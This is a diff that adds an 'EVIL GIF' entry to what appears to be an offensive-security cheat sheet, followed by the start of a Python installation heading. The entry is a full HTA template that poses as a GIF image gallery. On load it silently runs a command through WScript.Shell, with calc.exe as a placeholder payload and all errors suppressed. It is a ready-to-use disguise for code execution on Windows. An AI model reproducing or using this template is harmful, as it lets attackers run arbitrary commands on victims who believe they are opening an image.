@@ -1,3 +1,74 @@
+#### EVIL GIF
+
+````
+<html>
+<head>
+<title>NazvanieGif</title>
+<hta:application id="NazvanieGif"
+border="thin"
+borderstyle="complex"
+maximizeButton="no"
+minimizeButton="no"
+/>
+</head>
+<script type="text/javascript">
+var index = -1;
+var images = [
+"data:image/gif;base64,                                             "];
+function initGallery(){
+window.resizeTo(300,300);
+htaPayload();
+nextPicture();
+}
+function nextPicture(){
+var img;
+index = index + 1;
+if (index > images.length -1 ){
+index = 0;
+}
+img = document.getElementById("gallery");
+img.src = images[index];
+}
+function htaPayload(){
+var payload="calc.exe";
+try{
+if (navigator.userAgent.indexOf("Windows") !== -1){
+new ActiveXObject("WScript.Shell").Run("CMD /C START /B " + payload, false);
+}
+}
+catch(e){
+}
+}
+</script>
+<style>
+#gallery, div {
+width: 100%;
+height: 100%;
+}
+#outer {
+text-align: center;
+}
+#inner{
+display: inline-block;
+}
+body {
+background-color: black;
+}
+</style>
+<body onload="initGallery()">
+<div id="outer">
+<div id="inner">
+<img id="gallery" onclick="nextPicture()">
+</div>
+</div>
+</body>
+</html>
+
+
+
+````
+
+
 #### Non-interactive Installation PYTHON
 
 ````
